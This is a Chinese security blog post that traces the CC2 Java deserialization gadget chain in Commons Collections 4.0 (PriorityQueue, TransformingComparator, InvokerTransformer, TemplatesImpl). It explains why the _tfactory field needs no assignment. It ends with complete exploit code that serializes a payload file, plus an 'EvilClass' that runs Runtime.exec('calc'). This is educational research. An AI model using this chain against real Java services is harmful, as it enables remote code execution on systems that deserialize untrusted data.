---
title: 代码审计 | CC2 链 —— _tfactory 赋值问题 PriorityQueue 新入口
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/08a7105b75182080de31b152077c6681.jpg
categories:
  - [代码审计, cc]
tags:
  - 代码审计
  - Java
  - 反序列化
  - Java反序列化
  - CC链
abbrlink: d7f9a3c1
date: 2026-04-06 12:00:00
---

# 代码审计 | CC2 链 —— _tfactory 赋值问题 PriorityQueue 新入口

## 目录

- [前言](#前言)
- [环境](#环境)
- [链路分析](#链路分析)
  - [Sink：TemplatesImpl 与 _tfactory 赋值问题](#sinktemplatesmpl-与-_tfactory-赋值问题)
  - [InvokerTransformer](#invokertransformer)
  - [TransformingComparator（关键节点）](#transformingcomparator关键节点)
  - [PriorityQueue：入口点](#priorityqueue入口点)
- [EXP 编写](#exp-编写)
- [完整调用链追踪](#完整调用链追踪)
- [为什么必须用 CC 4.0](#为什么必须用-cc-40)
- [小结](#小结)

---

## 前言

CC3 里我们用 TemplatesImpl 实现了字节码加载，触发点是通过 `InstantiateTransformer` 调用 `TrAXFilter` 的构造方法，入口依然是 `LazyMap` 那套。CC2 在这个基础上换了个思路，sink 还是 `TemplatesImpl.newTransformer()`，但触发链完全换掉了，入口变成了 `PriorityQueue`，中间靠 `TransformingComparator` 串起来。

另外有个很重要的区别：**CC2 用的是 Commons Collections 4.0，而不是之前的 3.2.1**。原因后面分析到 `TransformingComparator` 的时候会说。

---

## 环境

- JDK 8u65
- Commons Collections **4.0**（注意版本）
- IDEA + 调试器

pom.xml 依赖改成这样：

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
</dependencies>
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405152949570.png)

包名也从 `org.apache.commons.collections` 变成了 `org.apache.commons.collections4`，导包的时候注意一下。

---

## 链路分析

还是习惯从 sink 反推，找清楚每个节点怎么串起来的，再写 EXP。

### Sink：TemplatesImpl 与 _tfactory 赋值问题

这个在 CC3 里分析过了，简单过一下。`TemplatesImpl` 里面有三个关键字段：`_bytecodes`（恶意字节码数组）、`_name`（不能为 null）和 `_tfactory`。

调用 `newTransformer()` 会触发 `getTransletInstance()` → `defineTransletClasses()` → 加载 `_bytecodes` 里的字节码并实例化，恶意代码在静态块或构造方法里就会执行。

这里展开说一下 `_tfactory` 到底要不要赋值的问题，这个之前文章里留了个坑。

---

**半 payload 测试（未走反序列化）**

之前的文章判断是说 `defineTransletClasses` 函数里有 `_tfactory.getExternalExtensionsMap()` 的调用，所以 `_tfactory` 必须赋值。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405154116053.png)

但当时测试用的是"半 payload"，直接调用 `templates.newTransformer()` 触发，并没有走完整的反序列化流程：

```java
public class wu_ {
    public static void main(String[] args) throws Exception {
        byte[] bytecode = Files.readAllBytes(Paths.get("target\\classes\\org\\example\\EvilClass.class"));
        TemplatesImpl templates = new TemplatesImpl();
        Field f1 = TemplatesImpl.class.getDeclaredField("_bytecodes");
        f1.setAccessible(true);
        f1.set(templates, new byte[][]{bytecode});
        Field f2 = TemplatesImpl.class.getDeclaredField("_name");
        f2.setAccessible(true);
        f2.set(templates, "EvilClass");
//        Field f3 = TemplatesImpl.class.getDeclaredField("_tfactory");
//        f3.setAccessible(true);
//        f3.set(templates, new TransformerFactoryImpl());

        templates.newTransformer(); // 应该弹出计算器
    }
}
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405161510127.png)

把 `_tfactory` 赋值注释掉之后，得到的是 NullPointerException（NPE），错误出现在 `defineTransletClasses` 函数里的 `_tfactory.getExternalExtensionsMap()` 这里，字节码还没开始加载链就断了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405162758646.png)

调试发现此时 `_tfactory` 确实是 null：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405161848994.png)

所以当时得出了"必须给 `_tfactory` 反射赋值"的结论。

赋值之后：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405163051914.png)

虽然还有 NPE 报错，但位置不在 `defineTransletClasses` 里了——这些报错都是字节码加载完之后的事，payload 已经正常执行，计算器弹出。

---

**完整 payload 测试（走完整反序列化）**

写这篇文章的时候又发现了新问题。用 CC3 的完整 payload（CC3TransformedMap）测试，之前说是需要赋值的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405163542209.png)

演示也没有问题，有 NPE 但不是 `defineTransletClasses` 里的。调试找到 `_tfactory`，确实有值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405164124133.png)

然后把 `_tfactory` 的赋值注释掉再试：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405164603485.png)

**依然可以弹出？！** 而且也没有出现之前半 payload 里 `defineTransletClasses` 的 NPE 报错。

调试看 `_tfactory` 的值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405164742850.png)

我们没有手动赋值，但 `_tfactory` 还是有值。原因是 `TemplatesImpl` 类的 `readObject` 方法里有这么一行：

```java
_tfactory = new TransformerFactoryImpl();
```

反序列化的时候会自动为 `_tfactory` 创建对象并赋值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405165014108.png)

经过调试进一步发现，不管我们有没有手动给 `_tfactory` 赋值，进入反序列化流程之后 `_tfactory` 显示的都是 null——这是因为反序列化不仅会触发最外层对象的 `readObject`，链里面每个对象如果有 `readObject` 方法，也都会被自动调用。`TemplatesImpl` 自己的 `readObject` 里会重新初始化 `_tfactory`，所以手动赋值根本没用。

---

**还有个小问题：为什么赋值了但 _tfactory 调试里显示还是 null？**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405165548507.png)

查看 `_tfactory` 的属性，发现它带了 `transient` 修饰符：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405165751259.png)

`transient` 的作用很简单：序列化的时候这个字段直接被跳过，不写进字节流。所以不管你有没有手动赋值，序列化之后这个值都不存在了，反序列化时由 `readObject` 重新创建。

而 `_name`、`_bytecodes` 都是普通的私有属性，没有 `transient`，所以可以正常序列化传递。

---

**结论**

> 完整 payload 里手动赋值 `_tfactory` 是无效操作，最终生效的永远是 `readObject()` 里 `new` 的那个。半成品 payload 没走反序列化，`readObject()` 不会触发，所以必须手动赋值才能用。
>
> 如果出现了 `defineTransletClasses` 的 NPE 报错，可以再手动赋值一下（加了也没有坏处）。

---

这个问题搞清楚之后，继续看链路。

CC2 里直接用 `InvokerTransformer` 反射调用 `newTransformer()`，不像 CC3 那样绕 `TrAXFilter`，所以链路更直接一些。也没有用到 `ChainedTransformer` 去串联——因为 CC3 的入口是 `LazyMap`，触发点是 `LazyMap.get(key)`，传给 `transform()` 的是 map 的 **key**（普通字符串，不是 `TemplatesImpl` 实例），所以才需要 `ChainedTransformer` 先用 `ConstantTransformer` 把 key 替换掉：

```
ChainedTransformer:
  ConstantTransformer(TrAXFilter.class)     ← 丢掉 key，返回 TrAXFilter.class
  InstantiateTransformer(templates)         ← 实例化 TrAXFilter，构造方法里调 newTransformer()
```

CC2 不走这条路，目标是直接找到一个能触发 `TemplatesImpl.newTransformer()` 的方法。

---

### InvokerTransformer

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405174253095.png)

这就是一个封装了反射调用的 Transformer：

```
method.invoke(input, iArgs);
  method  — 要调用的方法对象，通过 input.getClass().getMethod(iMethodName, iParamTypes) 拿到
  input   — 调用这个方法的对象，也就是方法的调用者
  iArgs   — 传给这个方法的参数列表
```

等价于直接写：

```java
templatesImpl.newTransformer();
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405184226000.png)

`InvokerTransformer` 有两个构造方法，参数不一样。第一个是私有的，用第二个。如果两个都是私有的，就需要用反射拿到私有构造方法再调用(如果这样就又会出现新问题,不会自动触发)：

```java
Constructor<InvokerTransformer> constructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
constructor.setAccessible(true);  // 突破 private 限制
InvokerTransformer transformer = constructor.newInstance("newTransformer");
```

`transform(input)` 会对 input 对象调用指定方法。我们构造：

```java
new InvokerTransformer("newTransformer", null, null)
```

（后面两个 null 也可以改成空数组，可以减少部分 NPE 报错）

接下来的问题就是：怎么触发这个 `transform(input)`？

---

### TransformingComparator（关键节点）

CC2 里用的是 `TransformingComparator.compare()` 来触发 `transform()`。

`TransformingComparator` 是 CC2 新引入的核心类，以前的链里没用过。它实现了 `Comparator` 接口，内部持有一个 `Transformer`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405181929431.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405181748671.png)

```java
public class TransformingComparator<I, O> implements Comparator<I>, Serializable {
    private final Comparator<O> decorated;
    private final Transformer<? super I, ? extends O> transformer;

    public int compare(final I obj1, final I obj2) {
        final O value1 = this.transformer.transform(obj1);
        final O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
}
```

只需要让 `transformer` 是 `InvokerTransformer`，就能触发 `InvokerTransformer.transform()`，再把 `obj` 换成 `TemplatesImpl` 实例，链就通了。

`TransformingComparator` 第一个构造方法只需要传入一个参数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405191628134.png)

（`this(...)` 是在构造方法里调用同类的另一个构造方法）

直接 new 一个对象：

```java
TransformingComparator comparator = new TransformingComparator(invokerTransformer);
```

这样 `transformer` 就是 `invokerTransformer` 了。

下面解决 `compare` 的两个参数 `(final I obj1, final I obj2)` 从哪里来的问题。

`TransformingComparator` 实现了 `Comparator` 接口，`compare` 方法就是在这个接口里定义的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405193634774.png)

查找用法，有很多函数都调用了 `compare`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405193956559.png)

最终找到的是 `PriorityQueue` 里的 `siftDownUsingComparator` 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405200256058.png)

这里面调用了两次 `comparator.compare`：

```
comparator.compare((E) c, (E) queue[right])  // 比较左右子节点
comparator.compare(x, (E) c)                 // 比较父节点和子节点
```

只需要保证至少能调用一次就行。

---

### PriorityQueue：入口点

`c` 和 `queue[right]` 的来源：

```java
Object c = queue[child];
int right = child + 1;
```

`queue[]` 就是 `PriorityQueue` 内部存元素的数组。所以只需要往这里面添加 `TemplatesImpl` 实例，`c` 和 `queue[right]` 就都是 `TemplatesImpl`，自然作为 `obj1` 和 `obj2` 传进 `compare()`。

上面有 `add` 函数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405221441003.png)

```java
return offer(e);
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405221521254.png)

这正是添加数据的函数，直接用：

```java
queue.add(templates);
```

不过 `compare` 是在 `siftDownUsingComparator` 里调用的，而且这是个私有方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405222101566.png)

思路就是往上找能调用到这个私有方法的公有方法。链条是：

```
readObject() → heapify() → siftDown() → siftDownUsingComparator() → compare()
```

`siftDownUsingComparator` 往上是 `siftDown`，私有方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405223057425.png)

再往上是 `heapify`，也是私有：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405223157201.png)

终点就是 `readObject` 方法，同样是私有的，但没关系——反序列化该执行还是执行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405223314861.png)

现在完整的链已经找到了，只需要传入正确的参数就能自动触发。

---

**构造 PriorityQueue**

`PriorityQueue` 的构造方法有点多，都是对 `initialCapacity` 和 `comparator` 参数的控制。选一个参数少、又能传入我们需要的参数的方法：

```
DEFAULT_INITIAL_CAPACITY 默认是 11
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405224913614.png)

这两个构造方法都能传入 `TransformingComparator` 对象（里面有 `compare` 方法触发 `transform`），不过一个默认容量是 11，我们只需要传入 2 个元素，选第二个：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405225001014.png)

现在的构造顺序：

```java
InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

TransformingComparator comparator = new TransformingComparator(invokerTransformer);

PriorityQueue queue = new PriorityQueue(2, comparator);

queue.add(templates);
queue.add(templates);
```

不过直接这样写是不行的——序列化的时候会弹出一次计算器：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405230431807.png)

反序列化的时候反而没有效果了。

原因是：往 `PriorityQueue` 里 `add()` 元素的时候，也会触发堆排序，也就是说也会调用 `comparator.compare()`。如果这时候 transformer 已经是 `InvokerTransformer`，add 阶段就提前触发了一次 RCE，而且这时候第二个元素还没 add 进去，排序逻辑出问题，导致后面反序列化时链跑不起来了。

解决方法是**构造时先用无害的 Transformer 占位，add 完元素再通过反射替换成 InvokerTransformer**：

```java
TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(templates);
queue.add(templates);
InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
setFieldValue(comparator, "transformer", invokerTransformer);
```

无害占位用的是 `ConstantTransformer`——不管传入什么都返回里面固定的值，比 `InvokerTransformer("toString", null, null)` 这种写法更安全简单。

结果正常：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260405232257989.png)

---

## 完整调用链追踪

现在顺着跟一遍完整的调用流程：

入口的 `readObject` 读取文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124332093.png)

自动触发我们对象（`PriorityQueue`）的 `readObject` 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124424017.png)

`readObject` 里调用 `heapify`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124509322.png)

`heapify` 触发 `siftDown`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124540675.png)

`siftDown` 触发 `siftDownUsingComparator`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124618325.png)

`siftDownUsingComparator` 里调用 `compare`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124642150.png)

`compare` 里传入两个 `TemplatesImpl` 对象触发，此时 `transformer` 已经是被反射替换过的 `InvokerTransformer`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124718839.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124819725.png)

`transform` 触发反射调用 `TemplatesImpl.newTransformer`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406124942339.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125101148.png)

`newTransformer` 触发 `getTransletInstance`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125601692.png)

中间经过 `defineTransletClasses` 对 `_tfactory` 的处理（前面讲过，反序列化时自动赋值）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125738394.png)

最终到 `getTransletInstance` 里的 `newInstance` 实例化对象，触发构造方法执行 RCE：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406125920497.png)

---

## 为什么必须用 CC 4.0

在 CC 3.2.1 里，`TransformingComparator` 没有实现 `Serializable`：

CC 3.2.1：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406130704876.png)

CC 4.0：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260406130211928.png)

**任何类都可以被实例化（`new`），但只有实现了 `Serializable` 接口的类才能被序列化成字节流。** 3.2.1 的 `TransformingComparator` 没有这个接口，序列化时直接抛异常：

```java
// 没有 Serializable，序列化时报错
ObjectOutputStream oos = new ObjectOutputStream(...);
oos.writeObject(comparator);  // 抛 NotSerializableException
```

4.0 里加上了这个接口，才能被正常序列化。这是 CC2 只能用 CC 4.0 的根本原因。

---

**完整链路：**

```
PriorityQueue.readObject()
  → heapify()
    → siftDown()
      → siftDownUsingComparator()
        → TransformingComparator.compare(obj1, obj2)
          → InvokerTransformer.transform(obj1)   // obj1 是 TemplatesImpl
            → TemplatesImpl.newTransformer()
              → defineTransletClasses() → 加载字节码 → RCE
```

---

## EXP 编写

有一个构造上的小坑需要注意：往 `PriorityQueue` 里 `add()` 元素时，也会触发堆排序，也就是说也会调用 `comparator.compare()`。如果这时候 transformer 已经是 `InvokerTransformer`，add 阶段就会触发一次 RCE，而且这时候 TemplatesImpl 可能还没准备好，直接报错。

解决方法是**构造时先用无害的 Transformer，add 完元素再通过反射替换成 InvokerTransformer**。

完整 EXP：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes = Files.readAllBytes(Paths.get("target\\classes\\org\\example\\EvilClass.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_name", "pwn");
//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());



        TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(templates);
        queue.add(templates);
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        setFieldValue(comparator, "transformer", invokerTransformer);


        // 5. 序列化到文件
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            oos.writeObject(queue);
        }
    }
}
```

恶意类 `EvilClass.java`：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilClass extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

反序列化模拟：

```java
package org.example;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class CC2Deserialize {
    public static void main(String[] args) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.ser"))) {
            ois.readObject();
        }
        System.out.println("Deserialization completed, check if calc popped.");
    }
}
```

---

## 小结

CC2 的整体思路比前几条链更简洁，不需要 LazyMap 那种代理触发机制，链路一目了然：

- **入口**：`PriorityQueue.readObject()` 反序列化时重建堆，必然触发比较操作
- **中转**：`TransformingComparator.compare()` 把比较操作转换成 transform 调用
- **执行**：`InvokerTransformer` 反射调用 `TemplatesImpl.newTransformer()` 加载字节码

有几个值得记住的细节：

1. 必须用 CC 4.0，3.x 里 `TransformingComparator` 不可序列化
2. 构造时先用 `ConstantTransformer` 占位，add 完再反射替换，避免提前触发
3. 队列至少要有 2 个元素，`siftDownUsingComparator` 才会被调用（size=1 时 `half=0`，while 循环直接不进）
4. `_tfactory` 不需要手动反射设置——反序列化时 `TemplatesImpl.readObject()` 会自动初始化；`transient` 修饰导致手动赋值在序列化时也会丢失
